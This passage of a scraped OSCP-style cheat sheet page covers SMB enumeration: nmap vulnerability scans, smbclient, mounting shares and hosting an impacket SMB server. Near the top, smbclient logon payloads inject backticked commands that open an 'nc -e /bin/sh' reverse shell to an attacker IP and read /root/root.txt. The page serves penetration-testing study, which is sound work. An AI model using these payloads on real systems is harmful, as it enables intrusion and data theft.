//LAME/tmp</span></span></div><div class="codeLine-a3169fbc" data-key="d2bfd76612254f54a96524c392b1c089"><span data-key="a32d235035d04665917de9aa20ddb2ce"><span data-offset-key="a32d235035d04665917de9aa20ddb2ce:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="737a8e16a47540188910986ca6ab7638"><span data-key="c2790047aa994cc18be2b22fcc3122ed"><span data-offset-key="c2790047aa994cc18be2b22fcc3122ed:0">nmap -T4 -sS -sC -Pn -A --script smb-vuln* ip</span></span></div><div class="codeLine-a3169fbc" data-key="ee48cac2dc584a169781b03d9b692173"><span data-key="4e23de072995415b807beefcfaea331e"><span data-offset-key="4e23de072995415b807beefcfaea331e:0">smbclient //ip/tmp</span></span></div><div class="codeLine-a3169fbc" data-key="63b6f3feb84d42b3ba5c0f0efab0e982"><span data-key="f22103ccd88a49d7b35291039c491a87"><span data-offset-key="f22103ccd88a49d7b35291039c491a87:0">logon &quot;./=`nohup nc -e /bin/sh LHOST LPORT`&quot;</span></span></div><div class="codeLine-a3169fbc" data-key="ee2e952c53f647beb6c0beed2893dd85"><span data-key="05e318eb8d7445e3858c04787c773245"><span data-offset-key="05e318eb8d7445e3858c04787c773245:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="f0d884809e0d40a8b17512a585a44883"><span data-key="4cbcfd0972154291a15ad6b2793682f3"><span data-offset-key="4cbcfd0972154291a15ad6b2793682f3:0">smbclient -U &quot;/=\`nohup cat /root/root.txt &gt; /tmp/ttt\`&quot; -N -I ip //LAME/tmp</span></span></div><div class="codeLine-a3169fbc" data-key="2d20592e243c4e2899a4438dd9c1a009"><span data-key="c324377cb2894888a2af35498d84c8cb"><span data-offset-key="c324377cb2894888a2af35498d84c8cb:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="2f620e46e4e44e3c9e74f433cbdb8749"><span data-key="68ef8bdabfbe45c49732d2358c6e50f8"><span data-offset-key="68ef8bdabfbe45c49732d2358c6e50f8:0">smbclient -U &quot;/=\`nohup nc -e /bin/sh 10.10.15.11 60000\`&quot; -N -I ip //LAME/tmp</span></span></div><div class="codeLine-a3169fbc" data-key="451bba0eeeac4e93b8b670deed690d4e"><span data-key="9d68be9fc14a42c0b34c3e514f90f826"><span data-offset-key="9d68be9fc14a42c0b34c3e514f90f826:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="42c09433c26c404695df002333c3fdac"><span data-key="e4373114de104f019a3cf454369144ed"><span data-offset-key="e4373114de104f019a3cf454369144ed:0">smbclient -L ip</span></span></div><div class="codeLine-a3169fbc" data-key="f8d6035a95784e7491713d8f8cc8f1a1"><span data-key="13af6335af864c56a94fea8ca362ddb9"><span data-offset-key="13af6335af864c56a94fea8ca362ddb9:0">enum4linux -S ip</span></span></div><div class="codeLine-a3169fbc" data-key="7353f7e4264f4e1bb889ee028c1f3769"><span data-key="59e8d39560b248de8d4b4bff7cd99da9"><span data-offset-key="59e8d39560b248de8d4b4bff7cd99da9:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="af6f1ca94c7549259f48b4844fe3a7fe"><span data-key="c3c0d944ff2546a896514686993d66c5"><span data-offset-key="c3c0d944ff2546a896514686993d66c5:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="59f17eaef9a84c8cab64486f3f03124c"><span data-key="d005042ab7c44a0798324df7c626ba93"><span data-offset-key="d005042ab7c44a0798324df7c626ba93:0"><span data-slate-zero-width="n">​</span></span></span></div></pre></div><h2 id="nmap-smb-script-scan" class="blockHeading-442b4f12--blockHeading2WithMargin-532d771d" data-key="3a79175437c64a96b511ba917f33dea8"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="12f9518849cc42db90b48d693fbb214d"><span data-offset-key="12f9518849cc42db90b48d693fbb214d:0">Nmap SMB Script Scan</span></span></span><a href="smb-enumeration#nmap-smb-script-scan" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="9437e7883ae6400ba6f984d615a2002d" spellcheck="false" class="reset-3c756112--codeBlock-36378b66"><div class="codeLine-a3169fbc" data-key="c34a3cfa6cae4a47b0042948d8bdb1b7"><span data-key="ec456ce26a1d4497b939c8cc7b1e97f0"><span data-offset-key="ec456ce26a1d4497b939c8cc7b1e97f0:0">#SMB Users and share Scan</span></span></div><div class="codeLine-a3169fbc" data-key="dc29c01f52bb4a8ba464ffcae5f63a9e"><span data-key="9a33eb24d342468e9fc4d82c38d72d4a"><span data-offset-key="9a33eb24d342468e9fc4d82c38d72d4a:0">nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse ip</span></span></div><div class="codeLine-a3169fbc" data-key="f06fbbfb78544bb9bf352e94463ed106"><span data-key="3320eca97b094d94b248fd532c80e39e"><span data-offset-key="3320eca97b094d94b248fd532c80e39e:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="c6503ce6ad6740d6b25090287978dfc1"><span data-key="ea19fed930744ea28d27d162b2d81a3c"><span data-offset-key="ea19fed930744ea28d27d162b2d81a3c:0">#SMB Vulnerability Scan</span></span></div><div class="codeLine-a3169fbc" data-key="6a615c2da5a6440c918f67a1849b167d"><span data-key="ddf03d73760249ff92df1f7d798b4f02"><span data-offset-key="ddf03d73760249ff92df1f7d798b4f02:0">nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse ip</span></span></div><div class="codeLine-a3169fbc" data-key="9ea76d03cb8b46b3af04414d98a7720c"><span data-key="903c68df7d324e23ae380d80aeef372c"><span data-offset-key="903c68df7d324e23ae380d80aeef372c:0">nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 ip</span></span></div><div class="codeLine-a3169fbc" data-key="e25bd6a9b964456f8e0196a931119d62"><span data-key="a8a7541b33e946b7bb7c412d5b0d54bd"><span data-offset-key="a8a7541b33e946b7bb7c412d5b0d54bd:0">nmap --script=smb-check-vulns.nse x.x.x.x</span></span></div><div class="codeLine-a3169fbc" data-key="5cbe7839a46f4139934ef46f0afb1c2b"><span data-key="16c9c42cf8ff4bb989a6f07f21a4ee39"><span data-offset-key="16c9c42cf8ff4bb989a6f07f21a4ee39:0"><span data-slate-zero-width="n">​</span></span></span></div></pre></div><h2 id="mounting-file-share" class="blockHeading-442b4f12--blockHeading2WithMargin-532d771d" data-key="77ceb6decd9241249fd9fbf67db5b55e"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="332c71b2fd424524bf7e0e52f7b6b032"><span data-offset-key="332c71b2fd424524bf7e0e52f7b6b032:0">Mounting File Share</span></span></span><a href="smb-enumeration#mounting-file-share" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="a4fd4a49e5e24124b869496f24dec758" spellcheck="false" class="reset-3c756112--codeBlock-36378b66"><div class="codeLine-a3169fbc" data-key="8d4c060fa6454583a812bdf2542e096a"><span data-key="141701c895794f25b0670015f381fa65"><span data-offset-key="141701c895794f25b0670015f381fa65:0">mount ip:/vol/share /mnt/nfs  -nolock</span></span></div><div class="codeLine-a3169fbc" data-key="c130c52e660f417199faff9874fdbaa0"><span data-key="74ceea65f3f6495b9f36053e37c2bbf3"><span data-offset-key="74ceea65f3f6495b9f36053e37c2bbf3:0">mount -t cifs -o username=user,password=pass,domain=blah //ip.X/share-name /mnt/cifs</span></span></div><div class="codeLine-a3169fbc" data-key="1592a2353acf422c8bec21e25f98b167"><span data-key="78e039a141a0427f868512be3bc99a46"><span data-offset-key="78e039a141a0427f868512be3bc99a46:0">mount -t cifs //x.x.x.x/share /mnt</span></span></div><div class="codeLine-a3169fbc" data-key="fc07284830fa424eb783db3382c12572"><span data-key="d137e1b064f94db3bc9a24bc37658105"><span data-offset-key="d137e1b064f94db3bc9a24bc37658105:0">mount -t cifs -o username=hodor,password=hodor //x.x.x.x/share /mnt</span></span></div><div class="codeLine-a3169fbc" data-key="babb712cf08143be88d555dd935e1d08"><span data-key="821ac57f3a82455886dee10c33ddab16"><span data-offset-key="821ac57f3a82455886dee10c33ddab16:0">Mounting File Share</span></span></div><div class="codeLine-a3169fbc" data-key="2f1deac016af491a84f0fc2fc792ae02"><span data-key="88be8b362efe4135aca466ab6aaec796"><span data-offset-key="88be8b362efe4135aca466ab6aaec796:0">showmount -e IPADDR</span></span></div></pre></div><p class="blockParagraph-544a408c" data-key="20d067b9fb6542dfb2dcb45b07094075"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="11533cb60b4d4eb287b9b8140b849a64"><span data-offset-key="11533cb60b4d4eb287b9b8140b849a64:0">Mounting Share folder</span></span></span></p><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="5bbdd5f2c8ae455da1bcb40da138efa9" spellcheck="false" class="reset-3c756112--codeBlock-36378b66"><div class="codeLine-a3169fbc" data-key="6c52cd859b68420e9c9736a1ec0ce343"><span data-key="ef5be51d470e4f8182aed856e7698aba"><span data-offset-key="ef5be51d470e4f8182aed856e7698aba:0">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span></span></div><div class="codeLine-a3169fbc" data-key="defffe80080e4c37badf15bce961d83b"><span data-key="1ab052cdf6974ea3a9d05b38755477b5"><span data-offset-key="1ab052cdf6974ea3a9d05b38755477b5:0"><span data-slate-zero-width="n">​</span></span></span></div></pre></div><h2 id="create-a-smb-server" class="blockHeading-442b4f12--blockHeading2WithMargin-532d771d" data-key="460a5442874c4dddba6db9214b9385f2"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="1a60b18967c045c895a927335bead268"><span data-offset-key="1a60b18967c045c895a927335bead268:0">Create a SMB Server</span></span></span><a href="smb-enumeration#create-a-smb-server" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="c9710db89e654a24a87bc86103c047f1" spellcheck="false" class="reset-3c756112--codeBlock-36378b66"><div class="codeLine-a3169fbc" data-key="f4e53e14b33849feb6f23d3f74f77ad8"><span data-key="d0ae6c2ff6664af6bc7f6518ef35cb66"><span data-offset-key="d0ae6c2ff6664af6bc7f6518ef35cb66:0">in kali hosting a smb server</span></span></div><div class="codeLine-a3169fbc" data-key="33e5cb18f57f4b2a94ea08b3f6839c65"><span data-key="f3a3723f09b64ed989ea2691c28882fa"><span data-offset-key="f3a3723f09b64ed989ea2691c28882fa:0">impacket-smbserver ShareFolder `pwd`</span></span></div><div class="codeLine-a3169fbc" data-key="0bf6793b7c624516815d8e3284424f3a"><span data-key="b101e1eaba1f47a1bd4f02c576d0669f"><span data-offset-key="b101e1eaba1f47a1bd4f02c576d0669f:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="c3e459deeac24701bb4a94714c79a6bc"><span data-key="a336ab70cdbc42feafd4285984b946e7"><span data-offset-key="a336ab70cdbc42feafd4285984b946e7:0">In windows</span></span></div><div class="codeLine-a3169fbc" data-key="8d78b799fa914b748d857ce0a551542c"><span data-key="fa557d9b52af4a94a9eab1c263642457"><span data-offset-key="fa557d9b52af4a94a9eab1c263642457:0">New-PSDrive -Name &quot;Followme&quot; -PSProvider &quot;FileSystem&quot; -Root &quot;\\ip\ShareFolder&quot;</span></span></div></pre></div></div></div></div></div><div class="reset-3c756112--pageFooter-f1d5e2b0"><div class="reset-3c756112"><div class="reset-3c756112--navPagesLinks-67bea901"><a class="reset-3c756112--card-6570f064--whiteCard-fff091a4--cardPrevious-56a5e674" href="snmp-enumeration"><div class="reset-3c756112--cardIcon-5b647d22"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></g></svg></div><div class="reset-3c756112--cardBody-25dca3b1--cardPreviousBody-79f02c06"><div class="reset-3c756112--cardHint-2c5d8183"><span class="text-4505230f--TextH200-a3425406--textContentFamily-49a318e1">Previous</span></div><div class="reset-3c756112--cardTitle-32aa092e"><span class="text-4505230f--UIH400-4e41e82a--textContentFamily-49a318e1">SNMP Enumeration</span></div></div></a><a class="reset-3c756112--card-6570f064--whiteCard-fff091a4--cardNext-19241c42" href="web-application-fingerprinting"><div class="reset-3c756112--cardBody-25dca3b1"><div class="reset-3c756112--cardHint-2c5d8183"><span class="text-4505230f--TextH200-a3425406--textContentFamily-49a318e1">Next</span></div><div class="reset-3c756112--cardTitle-32aa092e"><span class="text-4505230f--UIH400-4e41e82a--textContentFamily-49a318e1">Web Application Directory bruteforcing / fingerprinting</span></div></div><div class="reset-3c756112--cardIcon-5b647d22"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></g></svg></div></a></div></div><div class="reset-3c756112--pageFooterColumns-ef8f347e"><div class="reset-3c756112--pageFooterSummary-12074aff"><div class="reset-3c756112--pageChangesSummary-08821678"><div class="reset-3c756112--pageContributors-5c59582e"><div class="reset-3c756112--ownerAvatarList-696792ce"></div></div><div class="reset-3c756112--pageEditedDate-b805c39a"><span class="text-4505230f--TextH200-a3425406--textContentFamily-49a318e1">Last updated <span>5 months ago</span></span></div></div></div></div></div></div><div class="reset-3c756112--pageSide-ad9fed26"><div class="reset-3c756112--stickyContainer-2bed3a82"><div style="padding-bottom:0" class="reset-3c756112"></div><div class="reset-3c756112--tocWrapper-506ea24c"><div class="reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--scrollableContainer-756c9114"><div class="reset-3c756112--pageSideSection-542f1fd5"><div class="reset-3c756112--menu-5b8a7448--pageToc-16c35922--pageTocLive-542f1fd5"><div class="reset-3c756112--withScrollbar-39338630--scrollAxisY-7680295e--menuItems-2e6f017b--pageTocLiveItems-67c61496"><div class="reset-3c756112--menuHeader-342906de--menuHeaderLight-2c5d8183"><div class="reset-3c756112--menuHeaderIcon-0c3ed569"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="21" y1="10" x2="7" y2="10"></line><line x1="21" y1="6" x2="3" y2="6"></line><line x1="21" y1="14" x2="3" y2="14"></line><line x1="21" y1="18" x2="7" y2="18"></line></g></svg></div><div class="reset-3c756112"><span class="text-4505230f--InfoH100-1e92e1d1--textContentFamily-49a318e1">Contents</span></div></div><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="smb-enumeration#smb-tools"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">SMB Tools</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="smb-enumeration#nmap-smb-script-scan"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">Nmap SMB Script Scan</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="smb-enumeration#mounting-file-share"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">Mounting File Share</span></span></div></a><a class="reset-3c756112--menuItem-aa02f6ec--menuItemLight-757d5235--menuItemInline-173bdf97--pageTocItem-f4427024" href="smb-enumeration#create-a-smb-server"><div class="reset-3c756112--menuItemContent-c44ec79e"><span class="text-4505230f--UIH300-2063425d--textContentFamily-49a318e1"><span class="text-4505230f--UIH200-50ead35f--textContentFamily-49a318e1--pageTocLinkH2-2294976c">Create a SMB Server</span></span></div></a></div></div></div></div></div></div></div></div></div></div></div></div></div></div>
+            <div id="__GITBOOK__ROOT__CLIENT__" style="display: none;"></div>
+            <script>
+            window.GITBOOK_STATE = {"state":{"database":{"orgs/-LhsLF5jwDfMzebaG_Lx/infos":{"kind":"org","data":{"kind":"org","uid":"-LhsLF5jwDfMzebaG_Lx","name":"infosecsanyam","createdAt":1561092229678,"createdBy":"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2","logoURL":null,"baseDomain":"infosecsanyam261","type":null,"spacesPermission":{},"customDomain":null,"ssoSignInLabel":null,"defaultSpace":"-LkvnWByFHssLOYr3_77","lockReason":null,"useCase":null,"usageStatuses":{"members":"below","privateSpaces":"reached","publicSpaces":"reached"},"hideBranding":false}},"spaces/-LkvnWByFHssLOYr3_77/infos":{"kind":"space","data":{"uid":"-LkvnWByFHssLOYr3_77","name":"OSCP","createdAt":1564371486737,"ownerID":"-LhsLF5jwDfMzebaG_Lx","isPrivate":false,"isUnlisted":false,"hasJWT":null,"secretToken":null,"baseName":"tryharder","createdBy":"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2","logoURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/spaces%2F-LkvnWByFHssLOYr3_77%2Favatar-1588689183922.png?generation=1588689184824231\u0026alt=media","fullLogoURL":null,"emoji":null,"colorPrimary":"#df4945","headerTheme":"none","font":null,"locale":null,"primaryRevision":"-MB7XsUNQDUZ9Ndaq0Vu","edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564371486737,"updatedAt":1593582110019,"count":107}},"algoliaAPIKey":"MzU5MzljNmZhMTgzMjk2OWFkN2VjOTUzNzdhOTA5OWZiMzBkZjMwNjBhZWE1NGI1MGFjMGZmOGUzNjkxMzdjMmZpbHRlcnM9LUxrdm5XQnlGSHNzTE9ZcjNfNzc=","customDomain":"oscp.infosecsanyam.in","links":[],"hasGitHubSync":false,"editOnGitHub":null,"googleAnalyticsID":"UA-171255602-1","intercomID":null,"hasPageRating":true,"hasPDFExport":false,"indexedRevision":"-MB7XsUNQDUZ9Ndaq0Vu"}},"spaces/-LkvnWByFHssLOYr3_77/revisions/-MB7XsUNQDUZ9Ndaq0Vu":{"kind":"revision","data":{"uid":"-MB7XsUNQDUZ9Ndaq0Vu","message":"","createdAt":1593582110018,"createdBy":"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2","parents":["-MB7W1_E0N8_xLl6rEtT"],"content":{"primaryVersion":"master","versions":{"master":{"index":0,"ref":"master","title":"1.0.0","github":null,"locale":null,"entryPage":"-LkvncVKCWG7FjmruL9J","pages":{"-LkvncVKCWG7FjmruL9J":{"uid":"-LkvncVKCWG7FjmruL9J","kind":"document","title":"All About OSCP","path":"master","href":null,"description":"Try Harder","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB3BhJwFgt15jPJUEYL%2Fmaster%2F-LkvncVKCWG7FjmruL9J%2Fdocument.json?alt=media\u0026token=733f6e46-7890-4e70-9409-2fabedc875e4","createdAt":1564371486741,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1564371676207,"updatedAt":1593503551553,"count":12}},"github":null,"stats":{"words":120,"images":2,"codeLines":0,"revisions":1},"pages":["-M42iOFlvXS6PZWB3-4L","-M6QF-3acTPsK1ehV7Ek","-LpGzxuPI7C_3DOtplGh","-Lkvo-PWMVjllFR5FEMI","-Llb9n_p_sSTobIE0sPP","-Ll1wF0eYq0aUyTOTckh","-LpHnJZ2dtVhnWpNCzmu","-LkvpWVq67p8I85Aouw0","-LlbCnHt3EACqe-gRQju","-LpHnj-5p8xCl27TZUqO","-LlbcRH7gYQzJ2RNcm1O","-LlbD4Y-NU9RLzKRgBqw","-M45dLL4t8rX3h9kosr5","-Llb84q7yuuTq5WpbOWn","-LxfQODCrRXhSMxAEJjc","-Lpy08ScFzY55tjQajjf"]},"-M42iOFlvXS6PZWB3-4L":{"uid":"-M42iOFlvXS6PZWB3-4L","kind":"document","title":"OSCP- One Page Repository","path":"one-page-methodology","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB3sNgYS7VrEZnkXmz0%2Fmaster%2F-M42iOFlvXS6PZWB3-4L%2Fdocument.json?alt=media\u0026token=59a8f76a-6536-4b2b-8a97-9fc23b86b446","createdAt":1585979167794,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586003735082,"updatedAt":1593514914846,"count":6}},"github":null,"stats":{"words":1167,"images":3,"codeLines":0,"revisions":0},"pages":null},"-M6QF-3acTPsK1ehV7Ek":{"uid":"-M6QF-3acTPsK1ehV7Ek","kind":"document","title":"About the Author","path":"about-the-author","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M6p4RK-szlOySk1TWYd%2Fmaster%2F-M6QF-3acTPsK1ehV7Ek%2Fdocument.json?alt=media\u0026token=0e984928-b5e5-4029-a293-84d883c12da9","createdAt":1588521337126,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1588521976318,"updatedAt":1588955006656,"count":4}},"github":null,"stats":{"words":120,"images":0,"codeLines":0,"revisions":0},"pages":null},"-LpGzxuPI7C_3DOtplGh":{"uid":"-LpGzxuPI7C_3DOtplGh","kind":"document","title":"Basic Linux \u0026 Windows Commands","path":"basic-linux-commands","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-M48SaYs88X-iCyXPpKu%2Fmaster%2F-LpGzxuPI7C_3DOtplGh%2Fdocument.json?alt=media\u0026token=03a1ecc4-e9c2-4779-95fa-b859a00a55fc","createdAt":1569038786202,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1569052913840,"updatedAt":1586081738403,"count":3}},"github":null,"stats":{"words":10,"images":0,"codeLines":0,"revisions":1},"pages":["-M44yMxpl6QyRxffiJuL","-LpH8MTyxrnfKBuREpwU","-LlbDkkuNuTe4bps1hqr","-LpH2pMp8WCB2aQg93Ab"]},"-M44yMxpl6QyRxffiJuL":{"uid":"-M44yMxpl6QyRxffiJuL","kind":"document","title":"Linux Commands","path":"linux-commands","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4-WzBvvM-Pk8nca-E%2Fmaster%2F-M44yMxpl6QyRxffiJuL%2Fdocument.json?alt=media\u0026token=8c452a5f-1b29-470d-b4f6-430ea3db49c1","createdAt":1586016911221,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1586016959801,"updatedAt":1593516998991,"count":3}},"github":null,"stats":{"words":1414,"images":0,"codeLines":122,"revisions":0},"pages":null},"-LpH8MTyxrnfKBuREpwU":{"uid":"-LpH8MTyxrnfKBuREpwU","kind":"document","title":"Windows","path":"windows","href":null,"description":"","documentURL":null,"createdAt":1569041250239,"edits":{"j6ZaMX7tH7hPcTxhoDPBTEdmlSz2":{"createdAt":1593517024560,"updatedAt":1593517381046,"count":2}},"github":null,"stats":{"words":0,"images":0,"codeLines":0,"revisions":0},"pages":["-LpHDSkFV8bRML0Pa7_N","-LpHC_NRnuOvdP32c2CK","-LpH8SDA-5xNckr4RNWI"]},"-LpHDSkFV8bRML0Pa7_N":{"uid":"-LpHDSkFV8bRML0Pa7_N","kind":"document","title":"cmd","path":"cmd","href":null,"description":"","documentURL":"https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/documents%2F-LkvnWByFHssLOYr3_77%2F-MB4-WzBvvM-Pk8nca-E%2Fmaster%2F-LpHDSkFV8bRML0Pa7_N%2Fdocument.json?alt=media\u0026token=e88d8838-ad57-4790-99b9-dd9e22fd38c6","createdAt":1569042586640,"edits":{"j6ZaMX7tH7hPc